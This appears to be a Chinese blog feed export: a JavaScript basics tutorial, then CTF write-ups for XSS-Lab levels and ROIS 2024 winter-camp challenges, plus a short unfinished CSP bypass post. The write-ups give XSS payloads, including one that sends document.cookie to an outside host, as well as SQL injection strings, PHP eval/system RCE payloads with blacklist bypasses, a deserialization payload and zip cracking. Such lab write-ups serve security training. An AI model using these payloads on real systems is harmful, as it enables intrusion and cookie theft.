if (condition) &#123;  /* 条件为真时运行的代码 */&#125; else &#123;  /* 否则，运行其他的代码 */&#125;

添加&#123;&#125;时，内可以添加多个语句，没有&#123;&#125;时，只会运行if下的第一个语句，例如：
if (condition)   /* 代码1; */  /* 代码2; */

只有条件为真时，代码1才会运行，不论条件是否为真，代码2都会运行。
更多选择：else if使用 else if可以使判断更多的条件和选项，例如
if (condition1) &#123;  /* 条件1为真时运行的代码 */&#125; else if (condition2) &#123;  /* 条件2为真时运行的代码 */&#125; else if (condition3) &#123;  /* 条件3为真时运行的代码 */&#125; else &#123;  /* 否则，运行其他的代码 */&#125;



switch 语句语法：
switch (表达式/值) &#123;  case 选择1:    运行这段代码    break;  case 选择2:    否则，运行这段代码    break;  // .......其他情况  default:    出现未定义时的情况下，运行这段代码&#125;

注意：

switch后的括号内可以是表达式或值。
default 之后不需要再有选项，并且不需要 break 语句，因为之后没有任何运行代码。如果之前没有选项匹配，则运行 default 选项。

循环for循环语法：
for (初始化操作; 开始/继续循环条件; 每次循环结束后的操作) &#123;  // 每次循环运行的代码&#125;

在关键字for括号内，我们有三个项目，以分号分隔：

一个初始化器 - 这通常是一个设置为一个数字的变量，它被递增来计算循环运行的次数。它也有时被称为计数变量。

一个开始&#x2F;继续循环条件 - 如前面提到的，这个定义循环何时停止循环。这通常是一个表现为比较运算符的表达式，用于查看退出条件是否已满足的测试。

一个循环结束后的操作 - 这总是被判断（或运行），每个循环已经通过一个完整的迭代消失时间。它通常用于增加（或在某些情况下递减）计数器变量，使其更接近退出条件值。


while 语句语法：
while (开始/继续循环条件) &#123;  // 每次循环运行的代码&#125;



do ... while 语句语法：
do &#123;  // 每次循环运行的代码&#125; while (继续循环条件)

与while 循环不同的是do...while 循环会先进行一次循环然后再判断条件满不满足循环的条件决定是否继续循环
跳出循环break 语句使用break 语句将立即退出本层循环
continue 语句continue 语句与break类似，但不是完全跳出循环，而是跳过本次循环continue 语句后的余下代码，条件成立的话执行下一个循环。
在for循环语句中，使用continue语句，跳过本次循环continue 语句后的余下代码，仍然会进行每次循环结束后的操作的代码
函数函数声明自定义函数语法：
function functionName(parameters) &#123;  // 函数体&#125;

注意：形参在()无需再使用let或者var声明，直接输入参数名即可
调用函数语法：
functionName(parameters)



匿名函数创建一个没有名称的函数，例如：
function() &#123;  alert(&#x27;hello&#x27;);&#125;

这个函数叫做匿名函数——它没有函数名！它也不会自己做任何事情。通常将匿名函数与事件处理程序或者将匿名函数分配为变量的值一起使用。例如：
var myButton = document.querySelector(&quot;button&quot;);myButton.onclick = function () &#123;  //将匿名函数与事件处理程序一起使用  alert(&quot;hello&quot;);&#125;;

var myGreeting = function () &#123;  //将匿名函数分配为变量的值  alert(&quot;hello&quot;);&#125;;



函数作用域函数内定义的变量和其他东西作用域仅在函数内，不能被函数外的代码访问。
假设一个 HTML 文件，它调用两个外部 JavaScript 文件，并且它们都有一个使用相同名称定义的变量和函数，若调用这个函数，只能访问到首先被引用文件的这个函数（第二个文件被忽视了），例如
&lt;!-- Excerpt from my HTML --&gt;&lt;script src=&quot;first.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;second.js&quot;&gt;&lt;/script&gt;&lt;script&gt;  greeting();&lt;/script&gt;

// first.jslet name = &quot;Chris&quot;;function greeting() &#123;  alert(&quot;Hello &quot; + name + &quot;: welcome to our company.&quot;);&#125;//偷懒写在一起了// second.jslet name = &quot;Zaptec&quot;;function greeting() &#123;  alert(&quot;Our company is called &quot; + name + &quot;.&quot;);&#125;

这两个函数都使用 greeting() 形式调用，但是你只能访问到 first.js 文件的greeting()函数（第二个文件被忽视了）。另外，第二次尝试使用 let 关键字定义 name 变量导致了一个错误。
返回值函数的返回值可以是任意类型的数据，例如数组、对象等数据类型
一些函数和方法函数1.Number()函数​	将其参数转换为数字
2.String()函数​	将其参数转换为字符串
3.Math.random()Math.random()是令系统随机选取大于等于 0.0 且小于 1.0 的伪随机 double 值
方法3.Window：alert() 方法window.alert() 令浏览器显示一个带有可选的信息的对话框，并等待用户离开该对话框。
在某些情况下（例如，当用户切换标签时）浏览器可能不会实际显示一个对话框，或者不等待用户离开对话框。
语法
alert()alert(message)

参数

message可选
是要显示在警告对话框中的字符串，如果传入其他类型的值，会转换成字符串。


返回值：无
完整内置对象以及其相关方法列表
JavaScript 标准内置对象 - JavaScript | MDN (mozilla.org)
]]></content>
      <categories>
        <category>编程</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS-Lab题解</title>
    <url>/posts/1041826382/</url>
    <content><![CDATA[施工中
XSS-LAB题解level1观察playroad与页面
/level1.php?name=test

页面内容
欢迎来到level1欢迎用户test

尝试在name=后插入xss语句&lt;script&gt;alert(1)&lt;/script&gt;，即
/level1.php?name=&lt;script&gt;alert(&#x27;heiheihei&#x27;)&lt;/script&gt;

成功触发XSS，进入下一关
level2中间存在个搜索框，尝试直接写入语句&lt;script&gt;alert(1)&lt;/script&gt;，查看服务端处理后的页面源代码
&lt;h1 align=center&gt;欢迎来到level2&lt;/h1&gt;&lt;h2 align=center&gt;没有找到和&amp;lt;script&amp;gt;alert(&#x27;heiheihei&#x27;)&amp;lt;/script&amp;gt;相关的结果.&lt;/h2&gt;&lt;center&gt;&lt;form action=level2.php method=GET&gt;&lt;input name=keyword  value=&quot;&lt;script&gt;alert(&#x27;heiheihei&#x27;)&lt;/script&gt;&quot;&gt;&lt;input type=submit name=submit value=&quot;搜索&quot;/&gt;

发现正文部分的回显都被html实体编码处理，但在搜索栏处存在着value=&quot;&lt;script&gt;alert(&#39;heiheihei&#39;)&lt;/script&gt;&quot;，因此可以进行构造闭合语句，&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;，返回后的页面代码在拼接处理后为
&lt;input name=keyword  value=&quot;&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;

成功触发XSS，进入下一关
level3通用的中间存在个搜索框，使用探测语句进行查看可以进行哪些操作
&lt;h2 align=center&gt;没有找到和&amp;lt;script&amp;gt; &amp;lt;/script&amp;gt; &amp;lt;Script&amp;gt; &amp;lt;/Script&amp;gt; &amp;lt;scrscriptipt&amp;gt; &amp;lt;SCRscriptIPT&amp;gt; &#x27; &amp;quot; () Onerror onerror javascript: JavaScript: &amp;lt;!-- --&amp;gt; eval() &amp;lt;a&amp;gt;  &amp;lt;img&amp;gt;  &amp;lt;iframe&amp;gt; &amp;lt;form&amp;gt; src &#123;&#125; / 相关的结果.&lt;/h2&gt;&lt;center&gt;&lt;form action=level3.php method=GET&gt;&lt;input name=keyword  value=&#x27;&amp;lt;script&amp;gt; &amp;lt;/script&amp;gt; &amp;lt;Script&amp;gt; &amp;lt;/Script&amp;gt; &amp;lt;scrscriptipt&amp;gt; &amp;lt;SCRscriptIPT&amp;gt; &#x27; &amp;quot; () Onerror onerror javascript: JavaScript: &amp;lt;!-- --&amp;gt; eval() &amp;lt;a&amp;gt;  &amp;lt;img&amp;gt;  &amp;lt;iframe&amp;gt; &amp;lt;form&amp;gt; src &#123;&#125; / &#x27;&gt;

发现&lt; &gt; &quot;都被过滤了，但&#39;与onerror等标签属性并没有被过滤，因此可以使用&#39;造闭合使用，使用语句&#39; onmouseover=alert(1) &#39;，进行对前面value的闭合和添加属性，onmouseover
level4level5level6level7level8level9level10level11level12level13level14level15level16level17level18level19level20level21level22level23level24level25level26level27level28level29level30level31level32level33level34level35level36level37level38level39level40
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF-Web</tag>
        <tag>CTF-WriteUp</tag>
        <tag>Web-XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>ROIS2024冬令营</title>
    <url>/posts/3320244556/</url>
    <content><![CDATA[WEEK1Web1.vue-terminal解法一：
​	老老实实用cd、ls、cat命令一步步找出下一个url
解法二：
​	直接找网页源码，无后端，所以flag在前端文件里，一通瞎找最后在app.2fa07618.js找到
methods: &#123;                   onExecCmd(n, e, t, o) &#123;                       &quot;flag&quot; === n ? t(&#123;                           type: &quot;html&quot;,                           content: &#x27;\n        &lt;ul class=&quot;custom-content&quot;&gt;\n          &lt;li class=&quot;t-dir&quot;&gt;flag: ROIS&#123;just_a_simple_linux_command_in_CTF&#125;&lt;/li&gt;\n        &lt;/ul&gt;\n        &lt;br&gt;\n        &#x27;                       &#125;) : o(&quot;Unknown command&quot;)                   &#125;



2.ez_maze
你能通关大土豆写的网页迷宫吗？小土豆想看看源代码摸索摸索门道，但是这是什么？？

解法一：
​	如果不进行反混淆的话会发现这样一个常量
const flag = &#x27;ROIS&#123;Its_&#x27; + _0x2e725b(0x180) + _0x2e725b(0x17a) + _0x2e725b(0x16a);

​	直接在浏览器控制台输入flag这个常量，就会出现所对应的值
解法二：
​	看到js这么一大坨类似乱码的，肯定是经过了混淆处理的，直接拖到反混淆工具里去（JavaScript Deobfuscator (dev-coco.github.io)），最后在一串的代码中找到了
const flag = &#x27;ROIS&#123;Its_fun_to_play_maze_with_js!&#125;&#x27;;

解法三：
​	由于是纯前端文件，所以也可以修改js代码实现弹出
function movePlayer(_0x2fa2ec, _0x1d96bc) &#123;	const _0x4c26cf = _0x2e725b,		_0x45acd1 = Math[_0x4c26cf(0x177)](_0x1d96bc / cellSize),		_0x118e43 = Math[&#x27;floor&#x27;](_0x2fa2ec / cellSize);	if (maze[_0x45acd1][_0x118e43] === 0x1) alert(_0x4c26cf(0x173)), resetGame(), window[_0x4c26cf(0x168)][_0x4c26cf(0x164)] = &#x27;/&#x27;;	else maze[_0x45acd1][_0x118e43] === 0x2 ? (alert(_0x4c26cf(0x16e) + flag), resetGame(), window[_0x4c26cf(0x168)][&#x27;href&#x27;] = &#x27;/&#x27;) : (playerX = _0x118e43 * cellSize, playerY = _0x45acd1 * cellSize, clearCanvas(), drawMaze(), drawPlayer(playerX, playerY));&#125;

以上是关于flag弹出的代码，重点在后面一个else上，有一个三元运算符：？进行条件的判定
else maze[_0x45acd1][_0x118e43] === 0x2 ? (alert(_0x4c26cf(0x16e) + flag), resetGame(), window[_0x4c26cf(0x168)][&#x27;href&#x27;] = &#x27;/&#x27;) : (playerX = _0x118e43 * cellSize, playerY = _0x45acd1 * cellSize, clearCanvas(), drawMaze(), drawPlayer(playerX, playerY));

直接爆改
function movePlayer(_0x2fa2ec, _0x1d96bc) &#123;	const _0x4c26cf = _0x2e725b,		_0x45acd1 = Math[_0x4c26cf(0x177)](_0x1d96bc / cellSize),		_0x118e43 = Math[&#x27;floor&#x27;](_0x2fa2ec / cellSize);	 (alert(_0x4c26cf(0x16e) + flag), resetGame(), window[_0x4c26cf(0x168)][&#x27;href&#x27;] = &#x27;/&#x27;);&#125;

就直接弹出flag了
解法四：
​	最开始我以为要拖动红点然后鼠标放红点上，后面按两下回车把撞墙的弹窗关了，flag就弹出来了
3.easy_PDD
题目开始提示：一种基于ip的检测技术

盲猜就是发送请求头X-Forwarded-For（xxf）后跟不同的地址。bp，启动！！！
添加入请求头
X-Forwarded-For:233.233.233.233

四选一个数字设成playroad然后设置playroad类型为数值，设置100个以上的数字即可
4.HTTP_Challengethis is GET method,your mission:1.I need a GET param &quot;ROIS&quot; valued 4052.I need a POST param &quot;Vegetables&quot; valued &quot;Potato&quot;3.Please use admin character4.request from 127.0.0.15.use browser &#x27;ROISBrowser&#x27;Complete All Missions, and I&#x27;ll give you the FLAG!!!

根据题目要求

1.get传参变量ROIS&#x3D;405，方式就是直接在url后加?ROIS&#x3D;405
2.POST传参变量Vegetables&#x3D;Potato
3.Please use admin character,使用hackbar抓包发送一次请求后再次抓包，发现cookie中存在这一变量，character=guest，直接把guest改成admin即可
4.request from 127.0.0.1与easy_PDD这一题一样的trick，设置X-Forwarded-For:127.0.0.1
5.use browser ‘ROISBrowser’（打开rois官网下载ROIS浏览器），设置useragent:ROISBrowse

Web作业[极客大挑战 2019]Http刚进来看到这个页面

然后一顿乱尝试，最后打开源码看到
&lt;a style=&quot;border:none;cursor:default;&quot; onclick=&quot;return false&quot; href=&quot;Secret.php&quot;&gt;氛围&lt;/a&gt;

​	style属性将边框和光标变化去除，onclick导致无法点击这个链接，在页面看起来和其他无差异
然后拼接url进入下一个页面

页面提示：It doesn’t come from ‘https://Sycsecret.buuoj.cn‘

添加请求头：Referer:https://Sycsecret.buuoj.cn

页面提示：Please use “Syclover” browser

修改user-agent请求头：User-Agent:Syclover

页面提示：No!!! you can only read this locally!!!

locally大概率就是通过ip进行检测，添加请求头：X-Forwarded-For:127.0.0.1
最后成功拿到flag：flag&#123;5d07ecd7-a0b7-4aa3-a3f7-fb7ec9afa6cb&#125;
Misceasy_password_zip
听说太简单的密码会被爆破，尊嘟假嘟o.O

​	根据题目提示，直接拿到kali里面爆破（不得不说就给2核，kali跑的真的慢）
John是一款Kali linux自带的密码破解工具，支持密码本破解。John基于密码本破解
输入命令
zip2john flag.zip &gt; flag .txt john flag.txt  

跑了很久之后，获得密码：passw
pseudo_encryption_zip
土豆非常热爱爆破，小涂决定做一道永远不可能爆出密码的。

​	根据题目提示，zip被修改二进制数据后实现伪加密（发现MISC题目的hint全在题目上哈哈哈哈哈哈哈哈哈哈）
zip伪加密是在文件头的加密标志位做修改，进而再打开文件时识被别为加密压缩包。
做这题时候的参考文章：
CTF——MISC——zip伪加密总结_zip伪加密实验总结-CSDN博客

找到全局方式位标记（有无加密）发现都被改成了01 00修改成00 00再次打开压缩包就发现flag.txt没有被加密,打开即可获得flag
crc32_easy_zip
到底什么人会把文件拆开再放在一起压缩啊？小涂如是说。
PS: flag不含花括号。


打开发现都是小于12字节的txt文件（最开始以为是铭文碰撞，然后发现不行），然后再网上一通乱找，发现了对于字节比较少的txt文件可以进行crc32碰撞，最后将这些内容拼接起来就可以拿到答案了
LSB_png
小涂拿放大镜看瞎了眼，也没找到flag。

一顿搜索找到了工具：Stegsolve

打开加密图片后，选择Analyse-DataExtract
Bit Planes 选中Reg、Green、Blue的第0位
然后选择预览


获得flag
change_size_png把图片拖到kali里面打开，然后发现图片打不开，估计就是图片的长宽高被修改了
一通梭哈，找到了个脚本通过crc32反推长宽高
import structimport zlibdef hexStr2bytes(s):    b = b&quot;&quot;    for i in range(0,len(s),2):        temp = s[i:i+2]        b +=struct.pack(&quot;B&quot;,int(temp,16))    return bstr1=&quot;49484452&quot;#文件头数据块标示IDCHstr2=&quot;0806000000&quot;bytes1=hexStr2bytes(str1)bytes2=hexStr2bytes(str2)wid,hei = 248,248#修改此处的宽高crc32 = &quot;0x72571F5D&quot;#请修改此处crc32的值for w in range(wid,wid+2000):    for h in range(hei,hei+2000):        width = hex(w)[2:].rjust(8,&#x27;0&#x27;)        height = hex(h)[2:].rjust(8,&#x27;0&#x27;)        bytes_temp=hexStr2bytes(width+height)        if eval(hex(zlib.crc32(bytes1+bytes_temp+bytes2))) == eval(crc32):            print(hex(w),hex(h))

最后运行结果得出
PS C:\MISC\图片隐写&gt; python 图片高宽检测.py0xf8 0x19f

然后用101editor修改图片的相关参数，就可以得到flag

WEEK2WebSQL注入小测试-easy源码（黑盒测试，写题的时候是没有源码的）
&lt;?phperror_reporting(0);$username = $_POST[&quot;username&quot;];$password = $_POST[&quot;password&quot;];$connect = mysqli_connect(&quot;mysql&quot;, &quot;easy&quot;, &quot;easy&quot;, &quot;easy&quot;);if (!$connect) &#123;  die(&quot;连接失败: &quot; . mysqli_connect_error());&#125;$sql = &quot;SELECT * FROM users WHERE username=&#x27;$username&#x27; AND password=&#x27;$password&#x27;&quot;;print(&quot;&lt;p&gt;&quot; . $sql . &quot;&lt;/p&gt;&quot;);if ($result = mysqli_query($connect, $sql)) &#123;    $row = mysqli_fetch_row($result);    if ($row[1] == &quot;admin&quot;) &#123;        print(&quot;&lt;p&gt;&quot; . $row[2] . &quot;&lt;/p&gt;&quot;);    &#125; else &#123;        print(&quot;&lt;p&gt;进不去！怎么想我都进不去吧？！&lt;/p&gt;&quot;);    &#125;&#125; else &#123;    print(&quot;&lt;p&gt;进不去！怎么想我都进不去吧？！&lt;/p&gt;&quot;);&#125;?&gt;

由于是黑盒测试，先向输入框写入语句，&#39; or 1=1 #判断一下注入，然后就直接弹出来flag了
SQL注入小测试-normal&lt;?phperror_reporting(0);$username = $_POST[&quot;username&quot;];$password = $_POST[&quot;password&quot;];$connect = mysqli_connect(&quot;mysql&quot;, &quot;normal&quot;, &quot;normal&quot;, &quot;normal&quot;);if (!$connect) &#123;  die(&quot;连接失败: &quot; . mysqli_connect_error());&#125;if ($username == &quot;&quot; || $password == &quot;&quot;) &#123;    print(&quot;&lt;p&gt;用户名或密码不能为空！&lt;/p&gt;&quot;);&#125; else &#123;    $sql = &quot;SELECT * FROM users WHERE username=&#x27;$username&#x27;&#x27; AND password=&#x27;$password&#x27;&quot;;    print(&quot;&lt;p&gt;&quot; . $sql . &quot;&lt;/p&gt;&quot;);    if ($result = mysqli_query($connect, $sql)) &#123;        $row = mysqli_fetch_row($result);        if ($row) &#123;            print(&quot;&lt;p&gt;用户：&quot; . $row[1] . &quot; 欢迎登录！&lt;/p&gt;&quot;);        &#125; else &#123;            print(&quot;&lt;p&gt;用户: &quot; . $username . &quot; 不存在或密码错误！&lt;/p&gt;&quot;);        &#125;    &#125; else &#123;        print(&quot;&lt;p&gt;进不去！怎么想我都进不去吧？！&lt;/p&gt;&quot;);    &#125;&#125;?&gt;

同样的是黑盒测试，先向输入框写入语句，&#39; or 1=1 #判断一下注入，发现无论是在用户名处使用语句还是密码处使用语句都是可以进行登录的，判断是直接进行sql的语句拼接，同时存在一个回显点，后使用联合注入法（文章：SQL注入-联合查询(union)注入 | WELLS Blog），从爆数据库再到爆字段再到获得flag（写的比较简陋）
SQL注入小测试-hard&lt;?phperror_reporting(0);$username = $_POST[&quot;username&quot;];$password = $_POST[&quot;password&quot;];$connect = mysqli_connect(&quot;mysql&quot;, &quot;hard&quot;, &quot;hard&quot;, &quot;hard&quot;);if (!$connect) &#123;  die(&quot;连接失败: &quot; . mysqli_connect_error());&#125;if ($username == &quot;&quot; || $password == &quot;&quot;) &#123;    print(&quot;&lt;p&gt;用户名或密码不能为空！&lt;/p&gt;&quot;);&#125; else &#123;    $sql = &quot;SELECT * FROM users WHERE username=&#x27;$username&#x27; AND password=&#x27;$password&#x27;&quot;;    print(&quot;&lt;p&gt;&quot; . $sql . &quot;&lt;/p&gt;&quot;);    if ($result = mysqli_query($connect, $sql)) &#123;        $row = mysqli_fetch_row($result);        if ($row) &#123;            print(&quot;&lt;p&gt;欢迎登录！&lt;/p&gt;&quot;);        &#125; else &#123;            print(&quot;&lt;p&gt;用户: &quot; . $username . &quot; 不存在或密码错误！&lt;/p&gt;&quot;);        &#125;    &#125; else &#123;        print(&quot;&lt;p&gt;进不去！怎么想我都进不去吧？！&lt;/p&gt;&quot;);    &#125;&#125;?&gt;

与之前相同的黑盒测试，写入语句&#39; or 1=1 #判断一下注入，同样发现无论是在用户名处使用语句还是密码处使用语句都是可以进行登录的，判断也是直接进行sql的语句拼接
与之前不同的是不存在回显点，后使用布尔忙注法（文章：SQL注入-布尔盲注 | WELLS Blog ），推荐使用脚本进行，与前面相同的顺序从爆数据库再到爆字段再到爆flag
WEEK3Webxss-1xss入门题目，一通观察源代码
&lt;script&gt;	function report()&#123;		document.location = `http://$&#123;document.location.hostname&#125;:8001/report.html?e=`+btoa(document.querySelector(&#x27;#input-textarea&#x27;).value)	&#125;	function execute(payload)&#123;		try&#123;			let parsed = acorn.parse(payload, &#123; ecmaVersion: &#x27;latest&#x27; &#125;).body;			alert(eval(payload));		&#125; catch(e)&#123; 			alert(&#x27;Error: &#x27;+e);		&#125;	&#125;	window.onload = _=&gt;&#123;		let p = (new URLSearchParams(document.location.search)).get(&#x27;e&#x27;);		if(p) execute(atob(p));	&#125;&lt;/script&gt;

alert(eval(payload));发现输入的指令最后通过eval执行，并且没有对其进行任何的过滤，题目的flag最后在robot用户的cookie中，直接构造playroad，1+window.open(&#39;http://xxxxxxxxxxxx.com/?$&#123;document.cookie&#125;&#39; ),借助最后webhook.site最后在url可以拿到flag

ez_rce源码
&lt;?phphighlight_file(__FILE__);//你知道php有什么危险函数吗？class backDoor&#123;    public $param;    static function evalTest($param)&#123;        eval($param);    &#125;&#125;if (@$_GET[&#x27;a&#x27;] === &quot;ok&quot;)&#123;    backDoor::evalTest($_GET[&#x27;b&#x27;]);&#125;

eval 函数可以动态执行字符串中的 PHP 代码
backDoor::evalTest($_GET[&#39;b&#39;]);调用 backDoor 类的静态方法 evalTest，执行 eval($param);语句，flag文件一般位于根目录
由此可以构造出playroad：?a=ok&amp;b=system(&#39;cat /flag&#39;);其中的system()函数可以执行系统命令，与此函数类似的还有system（），exec（），shell_exec（），passthru（）， pcntl_exec（）， popen（）， proc_open（），反引号
ez_rce_plus?&lt;?phphighlight_file(__FILE__);if (@$_SERVER[&#x27;HTTP_KEY&#x27;] !== &quot;Nzc2NTZjNjU2MzZmNmQ2NTVmNzQ2ZjVmNzI2ZjY5NzMyMQ==&quot;)    die(&quot;authentication failed!!&quot;);else&#123;    $nameFunction = htmlspecialchars(@$_POST[&quot;function&quot;]); unset($_POST[&quot;function&quot;]);    if(!$nameFunction) $nameFunction = htmlspecialchars(@$_POST[&quot;action&quot;]); unset($_POST[&quot;action&quot;]);    $nameFunction = waf($nameFunction);    $nameFunction = explode(&quot;/&quot;,$nameFunction);    $nameFunction = $nameFunction[1];    if($nameFunction)&#123;        $params = array();        forEach($_POST as $key =&gt; $item)&#123;            $item = waf($item);            array_push($params, $item); unset($_POST[$key]);        &#125;        $base64 = false; if(isset($_SERVER[&quot;HTTP_BASE64&quot;]))&#123; $base64 = $_SERVER[&quot;HTTP_BASE64&quot;] === &#x27;true&#x27; ? true : false; &#125;        $params = join(&quot;&#x27;,&#x27;&quot;, $params); $eval = $nameFunction.&quot;(&#x27;&quot;.$params.&quot;&#x27;)&quot;; $return = eval(&#x27;return &#x27;.$eval.&quot;;&quot;); echo jsonEncode($return, $base64);    &#125;&#125;function jsonEncode($value, $base64_encode = true)&#123;    $value = json_encode($value, JSON_PRETTY_PRINT);    if($base64_encode) $value = base64_encode($value);    return $value;&#125;function waf($input) &#123;    $blacklist = [&#x27;system&#x27;, &#x27;exec&#x27;, &#x27;flag&#x27;];    foreach ($blacklist as $word) &#123;        $input = str_replace($word, &#x27;&#x27;, $input);    &#125;    return $input;&#125;

首先解决
if (@$_SERVER[&#x27;HTTP_KEY&#x27;] !== &quot;Nzc2NTZjNjU2MzZmNmQ2NTVmNzQ2ZjVmNzI2ZjY5NzMyMQ==&quot;)

在http加入请求头key: Nzc2NTZjNjU2MzZmNmQ2NTVmNzQ2ZjVmNzI2ZjY5NzMyMQ==(这一串最后解码后发现是welecome_to_rois! 小彩蛋？)。
然后读代码
$nameFunction = htmlspecialchars(@$_POST[&quot;function&quot;]); unset($_POST[&quot;function&quot;]);   if(!$nameFunction) $nameFunction = htmlspecialchars(@$_POST[&quot;action&quot;]); unset($_POST[&quot;action&quot;]);   $nameFunction = waf($nameFunction);   $nameFunction = explode(&quot;/&quot;,$nameFunction);   $nameFunction = $nameFunction[1];   if($nameFunction)&#123;       $params = array();       forEach($_POST as $key =&gt; $item)&#123;           $item = waf($item);           array_push($params, $item); unset($_POST[$key]);       &#125;       $base64 = false; if(isset($_SERVER[&quot;HTTP_BASE64&quot;]))&#123; $base64 = $_SERVER[&quot;HTTP_BASE64&quot;] === &#x27;true&#x27; ? true : false; &#125;       $params = join(&quot;&#x27;,&#x27;&quot;, $params); $eval = $nameFunction.&quot;(&#x27;&quot;.$params.&quot;&#x27;)&quot;; $return = eval(&#x27;return &#x27;.$eval.&quot;;&quot;); echo jsonEncode($return, $base64);   &#125;

最后eval函数执行的是$_POST[&quot;action&quot;]中从左到右第一个/后的字段，并最后拼接字段$eval形成这样一个结果
函数名(&#x27;参数名&#x27;);

此时函数就可以考虑利用system()等函数读取根目录下的flag文件，这个过程中就会遇到一个waf函数
function waf($input) &#123;    $blacklist = [&#x27;system&#x27;, &#x27;exec&#x27;, &#x27;flag&#x27;];    foreach ($blacklist as $word) &#123;        $input = str_replace($word, &#x27;&#x27;, $input);    &#125;    return $input;&#125;

对&#39;system&#39;, &#39;exec&#39;, &#39;flag&#39;三个敏感词进行替换，这种可以直接进行双写绕过即可（即system写成syssystemtem）
最后的playroad可以写成action=syssystemtem&amp;wells=cat /flflagag,其中第二个名称可以随便设立
ez_rce_with_full_waf?&lt;?phphighlight_file(__FILE__);if (@$_SERVER[&#x27;HTTP_KEY&#x27;] !== &quot;Nzc2NTZjNjU2MzZmNmQ2NTVmNzQ2ZjVmNzI2ZjY5NzMyMQ==&quot;)    die(&quot;authentication failed!!&quot;);else&#123;    $nameFunction = htmlspecialchars(@$_POST[&quot;function&quot;]); unset($_POST[&quot;function&quot;]);    $nameFunction = waf($nameFunction);    if(!$nameFunction) $nameFunction = htmlspecialchars(@$_POST[&quot;action&quot;]); unset($_POST[&quot;action&quot;]);    $nameFunction = explode(&quot;/&quot;,$nameFunction);    $nameFunction = $nameFunction[1];    if($nameFunction)&#123;        $params = array();        forEach($_POST as $key =&gt; $item)&#123;            $item = waf($item);            array_push($params, $item); unset($_POST[$key]);        &#125;        $base64 = false; if(isset($_SERVER[&quot;HTTP_BASE64&quot;]))&#123; $base64 = $_SERVER[&quot;HTTP_BASE64&quot;] === &#x27;true&#x27; ? true : false; &#125;        $params = join(&quot;&#x27;,&#x27;&quot;, $params); $eval = $nameFunction.&quot;(&#x27;&quot;.$params.&quot;&#x27;)&quot;; $return = eval(&#x27;return &#x27;.$eval.&quot;;&quot;); echo jsonEncode($return, $base64);    &#125;&#125;function jsonEncode($value, $base64_encode = true)&#123;    $value = json_encode($value, JSON_PRETTY_PRINT);    if($base64_encode) $value = base64_encode($value);    return $value;&#125;function waf($input) &#123;    $blacklist = [&#x27;system&#x27;, &#x27;exec&#x27;, &#x27;flag&#x27; ,&#x27;`&#x27; ,&#x27;eval&#x27; ,&#x27;call&#x27; ,&#x27;$&#x27; ,&#x27;php&#x27; ,&#x27;require&#x27; , &#x27;_&#x27; , &#x27;file&#x27; ,&#x27;show&#x27; , &#x27;include&#x27;, &#x27;\&#x27;&#x27; , &#x27;&quot;&#x27; , &#x27;.&#x27;  , &#x27;&lt;&#x27; , &#x27;&gt;&#x27; ];    foreach ($blacklist as $word) &#123;        $input = str_replace($word, &#x27;hack!&#x27;, $input);    &#125;    return $input;&#125;

与上一题不同的是本题的waf()函数，限制更多且不能进行双写绕过(敏感词会变成hack！，而不是去除)
function waf($input) &#123;    $blacklist = [&#x27;system&#x27;, &#x27;exec&#x27;, &#x27;flag&#x27; ,&#x27;`&#x27; ,&#x27;eval&#x27; ,&#x27;call&#x27; ,&#x27;$&#x27; ,&#x27;php&#x27; ,&#x27;require&#x27; , &#x27;_&#x27; , &#x27;file&#x27; ,&#x27;show&#x27; , &#x27;include&#x27;, &#x27;\&#x27;&#x27; , &#x27;&quot;&#x27; , &#x27;.&#x27;  , &#x27;&lt;&#x27; , &#x27;&gt;&#x27; ];    foreach ($blacklist as $word) &#123;        $input = str_replace($word, &#x27;hack!&#x27;, $input);    &#125;    return $input;&#125;

如果直接使用$_POST[&quot;function&quot;]可以考虑用其他的执行系统命令的函数shell_exec（），passthru（）， pcntl_exec（）， popen（）， proc_open（），但在代码中，有一处漏洞：
if(!$nameFunction) $nameFunction = htmlspecialchars(@$_POST[&quot;action&quot;]); unset($_POST[&quot;action&quot;]);

此时的$nameFunction，没有进行任何的waf过滤，因此可以不设置$_POST[&quot;function&quot;]参数而使用$_POST[&quot;action&quot;]，对于flag这个词的绕过，可以使用linux系统的通配符如？、[]，将flag写成fla?
最后的playroad可以写成action=system&amp;wells=cat /fla?,其中第二个名称可以随便设立
unserialize-1&lt;?php$flag = &#x27;ROIS&#123;test&#125;&#x27;;class Name&#123;    public $name;    public $password;    public function __get($name) &#123;        echo $this-&gt;name;        return $name;    &#125;    public function __wakeup() &#123;        if($this-&gt;password!=null)&#123;            echo $this-&gt;password;        &#125;        else&#123;            echo $this-&gt;name;        &#125;    &#125;    public function __toString() &#123;        global $flag;        echo $flag;        return &quot;nice&quot;;    &#125;&#125;unserialize($_GET[&#x27;input&#x27;]);

unserialize()函数进行反序列化的函数（序列化与反序列化概念：一文搞懂序列化与反序列化）
然后有关于__wakeup()和__toString()的两个魔术方法
__wakeup()在反序列的过程中会自动调用
public function __wakeup() &#123;    if($this-&gt;password!=null)&#123;        echo $this-&gt;password;    &#125;    else&#123;        echo $this-&gt;name;    &#125;&#125;

如果此反序列化后的对象的password变量不为空，会打变量password反之打印name变量
__toString()在将对象被作为字符串中过程中会自动调用
public function __toString() &#123;    global $flag;    echo $flag;    return &quot;nice&quot;;&#125;

触发__toString()就可以打印出flag，所以本题的关键就是将对象被作为字符串中过程中会自动调用，而唯一有可能的就是反序列化过程中自动触发的echo
联想出将这个对象的name变量的值也是对象，password变量的值为空即可，即
使用s:45:&quot;O:4:&quot;Name&quot;:2:&#123;s:4:&quot;name&quot;;N;s:8:&quot;password&quot;;N;&#125;&quot;即可
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF-WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS绕过篇</title>
    <url>/posts/1946610579/</url>
    <content><![CDATA[施工中
CSP绕过内容安全策略（Content-Security-Policy,简称CSP）

内容安全策略 （CSP） 被认为是一种浏览器技术，主要用于防御跨站点脚本 （XSS） 等攻击。内容安全策略为白名单策略，通过定义和详细说明浏览器可以安全地加载资源的路径和源，不加载除Content-Security-Policy以外的内容

 使用 CSP的方式

使用 Content-Security-Policy HTTP 头
在html中添加入meta标签

